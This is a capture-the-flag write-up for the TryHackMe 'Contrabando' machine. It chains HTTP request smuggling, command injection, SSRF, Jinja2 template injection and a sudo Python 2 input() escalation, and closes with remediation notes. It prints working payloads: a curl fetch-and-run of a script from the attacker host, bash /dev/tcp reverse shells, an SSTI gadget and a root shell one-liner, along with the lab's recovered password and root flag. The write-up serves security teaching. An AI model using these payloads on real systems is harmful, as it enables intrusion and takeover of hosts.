# TryHackMe — Contrabando

Reconstructed from the raw session artifacts left in this folder (`jjkjmk.txt`,
`pre.txt`/`pre2.txt`, `req.txt`/`res.txt`, `payload_gen.py`, `shell.sh`,
`jjj.html`) after most of the attack-terminal scrollback was lost to the
history limit. Gaps between captures are called out as inferred rather than
observed.

- **Attacker (Kali):** `192.168.135.146` (`me.thm`)
- **Target:** `10.48.151.116` → `10.48.175.103` → `10.48.180.78` (`target.thm`,
  IP rotated across VPN reconnects, same box)
- **Flag (root):** `THM{All_AbouT_PassW0rds}`

## 1. The core trick: why a raw socket instead of Burp

The front end is an Apache reverse proxy sitting in front of a backend app
server on `localhost:8080`. The public path `/page/index.php` is reachable
directly; `/gen.php` (the password generator backend) is not — it's only
meant to be hit internally.

The bypass is a classic smuggling/desync: a second, fully-formed HTTP request
is embedded **inside the URI** of an allowed `GET` request, with its CR/LF
and spaces percent-encoded (`\r\n` → `%0d%0a`, space → `%20`, etc. — see
`payload_gen.py`). The front end forwards the oversized request line
as-is; the backend decodes the percent-encoding while parsing/rewriting the
path and ends up treating the decoded bytes as a second, independent request
on the same connection — landing it straight on `/gen.php`, past whatever
routing/ACL kept that endpoint from being reached directly from outside.

The reason this has to be sent as raw bytes over a TCP socket (`pwntools`
`remote()` in `payload_gen.py`) rather than through Burp Suite: Burp (like
most HTTP tooling) normalizes line endings and canonicalizes/validates the
request line before it goes out — it will not let you put a literal,
oversized, double-encoded "second request" inside a URI and send it
untouched. The whole exploit depends on the *exact* byte sequence reaching
the socket with the `%0d%0a` sequences still literal percent-encoded text
(not real CR/LF, and not re-encoded again) — a raw socket write is the only
way to guarantee that.

`payload_gen.py` builds exactly this:

```
outer:  GET <URI> HTTP/1.1\r\nHost: localhost\r\n\r\n

URI:    /page/index.php%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a
        User-Agent:%20...Firefox/120.0%0d%0a%0d%0a
        <percent-encoded smuggled request>
        %0d%0a%0d%0aGET%20/abc
```

`pre.txt` is the smuggled inner request before encoding:

```
POST /gen.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

length=8;sh -c "$(curl -s 192.168.135.146:9000/shell.sh)"
```

`req.txt` is the literal bytes actually sent on the wire; `res.txt` is one
captured attempt, which came back as a `502 Proxy Error` ("Error reading from
remote server") — the request desynced the connection without yet landing
cleanly, consistent with this needing a couple of tuning passes before the
smuggled `/gen.php` POST was accepted by the backend.

**Vulnerability in `gen.php`:** the `length` POST field is passed straight
into a shell command (something like `exec("generate.sh " . $_POST['length'])`
on the PHP side). The payload `length=8;sh -c "$(curl -s ... /shell.sh)"`
is a plain OS command injection riding along once the smuggled request
reaches that parameter.

## 2. Initial foothold

`shell.sh`, hosted from the attacker's `python3 -m http.server`:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.135.146/9876 0>&1'
```

The command-injected `gen.php` call fetches and runs it. Catching it with
`nc -lvnp 9876` lands a shell as `www-data` inside a container (hostname
`124a042cc76c` — a raw Docker container ID), confirming the exploited
service is containerized.

## 3. Container recon & internal pivot

`/var/www/html` has nmap/ncat binaries pre-staged, a full `nmap-7.991` build
tree, and `agent`/`agent1`/`agent2` — remnants of a failed attempt to drop a
pivoting agent (the `GET /agent` 404s in the attacker's HTTP server log line
up with this) before falling back to a plain static nmap binary
(`nmap-x64.tar.gz`, fetched from a public static-nmap-binaries release) to
scan the Docker bridge from inside the container:

```
./nmap 172.18.0.1-5 --min-rate=4000
172.18.0.1  22/tcp ssh, 80/tcp http, 5000/tcp (an internal Flask app)
172.18.0.2  80/tcp  (smug-apache-proxy-1 / backend.thm — the proxy from step 1)
172.18.0.3  8080/tcp (self — the backend hit by the smuggled request)
```

`172.18.0.1:5000` is the Docker **host**, serving an internal-only "Fetch
Website Content" tool (`website_url` POST field) — not reachable from outside
the Docker network, only discovered via this pivot.

## 4. SSRF → source disclosure → SSTI RCE

Probing `website_url` with `file://` URLs confirms classic SSRF/local-file
read (the backend uses `pycurl`, which happily follows `file://`):

- `file:///etc/passwd`, `file:///etc/os-release` — basic host fingerprinting
- `file:///proc/self/cmdline` — leaks the running script's own path
  (`/usr/bin/python3 /home/hansolo/app/app.py`)
- `file:///home/hansolo/app/app.py` — dumps the app's own source:

```python
from flask import Flask, render_template, render_template_string, request
import pycurl
from io import BytesIO

@app.route('/', methods=['GET', 'POST'])
def display_website():
    if request.method == 'POST':
        website_url = request.form['website_url']
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, website_url)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()
        content = buffer.getvalue().decode('utf-8')
        website_content = '''...%s...''' % content
        return render_template_string(website_content)
    return render_template('index.html')
```

The fetched remote content is string-interpolated straight into a template
and handed to `render_template_string` — a textbook SSTI: whatever the SSRF
fetches gets evaluated as a Jinja2 template server-side.

`jjj.html`, hosted on the attacker's web server:

```jinja
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.135.146/9877 0>&1"').read()}}
```

(the standard Jinja2 sandbox-escape gadget: reach the Flask `config` object
in scope → `__class__.__init__.__globals__` → the `os` module → `popen`.)

Pointing `website_url` at `http://192.168.135.146:9000/jjj.html` makes the
vulnerable app fetch it and render it as a template, executing the gadget
and popping a shell to `nc -lvnp 9877` — landing this time as the **host**
user `hansolo` on `contrabando` (outside the container, on `172.18.0.1`).

## 5. Privilege escalation: hansolo → root

`hansolo`'s home has `bf.py`, a brute-forcer against
`sudo /usr/bin/bash /usr/bin/vault`:

```python
CMD = ["sudo", "/usr/bin/bash", "/usr/bin/vault"]
def run_with_input(candidate):
    proc = subprocess.run(CMD, input=candidate + "*\n", text=True, ...)
    return "Password matched!" in proc.stdout
```

`/usr/bin/vault` itself:

```bash
compare () {
    content=$(/usr/bin/cat "$file_to_check")       # /root/password
    read -s -p "Enter the required input: " user_input
    if [[ $content == $user_input ]]; then
        /usr/bin/echo "Password matched!"
        /usr/bin/cat "$file_to_print"               # /root/secrets
    fi
}
```

The bug: `[[ $content == $user_input ]]` is a **glob match**, not a string
comparison. Appending `*` to each guess (`found + c + "*"`) means any
candidate that's a correct prefix of the real password matches regardless of
what follows, so the password can be recovered one character at a time
without ever reading the file directly. Result: `EQu5ehwHcRfZ`.

`sudo -l` for hansolo:

```
(root) NOPASSWD: /usr/bin/bash /usr/bin/vault
(root) /usr/bin/python* /opt/generator/app.py
```

The second rule is the actual privesc path. `/opt/generator/app.py` targets
Python 2 (it falls back to `raw_input`), and is invoked via
`sudo /usr/bin/python2 /opt/generator/app.py`. In Python 2, the builtin
`input()` **evaluates its argument as a Python expression** (unlike Python
3's `input()`, which just returns a string). The script calls `input()` for
the "words to add" prompt:

```python
secret = input("Any words you want to add to the password? ")
```

Supplying `__import__("os").system("/bin/bash")` there runs as Python 2 code
under the sudo rule — i.e. as root:

```
Any words you want to add to the password? __import__("os").system("/bin/bash")
root@contrabando:/home/hansolo# cat /root/root.txt
THM{All_AbouT_PassW0rds}
```

## Chain summary

```
Apache proxy (front end, localhost)
  └─ percent-encoded CRLF smuggled inside a GET URI (raw TCP, pwntools)
       → desyncs front/back-end parsing → lands a 2nd request on /gen.php
           → OS command injection in `length` param → reverse shell (www-data, container)
               → internal nmap scan of 172.18.0.0/24 from inside the container
                   → finds internal-only Flask "fetch website" SSRF tool on the Docker host
                       → file:// SSRF leaks the Flask app's own source
                           → SSRF-fetched content is rendered via Jinja2 render_template_string → SSTI RCE
                               → reverse shell (hansolo, Docker host)
                                   → vault glob-match flaw leaks /root/secrets (side quest)
                                   → sudo python2 app.py: Py2 input() = eval() → root
```

## Files in this folder

| File | Role |
|---|---|
| `payload_gen.py` | Builds and sends the raw smuggling request over a TCP socket (pwntools) |
| `pre.txt` | Smuggled inner request (plaintext, pre-encoding) |
| `pre2.txt` | Full post-exploitation session transcript (shell → root) |
| `req.txt` / `res.txt` | One captured attempt's raw request/response |
| `shell.sh` | Stage-1 reverse shell payload (bash, port 9876) |
| `jjj.html` | Jinja2 SSTI payload used as the SSRF target (port 9877) |
| `jjkjmk.txt` | Attacker-side terminal scrollback (http.server logs, nmap build log, ligolo pivot setup, base64-wrapped payload fetches) |

## Notes / remediation (for a real deployment)

- Front-end proxies must not forward raw, unvalidated request lines
  containing percent-encoded control characters; normalize/reject embedded
  `%0d%0a` before passing upstream.
- Never interpolate user- or SSRF-fetched content into a template string
  before rendering — use `render_template` with a fixed template and pass
  data as context, never `render_template_string` over dynamic content.
- Restrict `pycurl`/outbound-fetch features to an allow-listed scheme (block
  `file://`, `gopher://`, etc.) and to non-RFC1918 destinations.
- `[[ == ]]` in bash is glob matching — use `[[ "$a" = "$b" ]]` with quoting
  only guarantees literal comparison if neither side contains unquoted glob
  metacharacters from user input to begin with; better to compare with `=`
  after disabling globbing, or just do the comparison outside bash.
- Never grant `sudo ... python*` broadly — it includes Python 2, where
  `input()` is `eval()`.
